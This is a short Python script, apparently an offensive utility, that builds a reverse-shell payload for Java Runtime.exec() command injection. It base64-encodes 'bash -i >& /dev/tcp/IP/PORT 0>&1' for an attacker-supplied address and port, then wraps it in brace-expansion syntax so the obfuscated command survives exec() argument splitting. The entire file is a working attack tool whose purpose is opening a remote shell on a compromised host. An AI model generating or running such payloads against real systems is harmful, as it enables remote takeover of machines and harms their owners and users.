#!/usr/bin/python3

#Description: java.lang.Runtime.exec() Payload Workarounds - ReverseShell
#Author: Vert16x

import base64
import sys

def generate():
    IpAddress = sys.argv[1]
    Port = sys.argv[2]
    PayloadReverseShell = f"bash -i >& /dev/tcp/{IpAddress}/{Port} 0>&1".encode("utf-8")
    EncodedPayload = base64.b64encode(PayloadReverseShell)
    Base64ReverseShell = EncodedPayload.decode("utf-8")
    print("bash -c {echo,%s}|{base64,-d}|{bash,-i}"%(Base64ReverseShell))
    

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} 10.10.10.1 4444")
        sys.exit()
    generate()
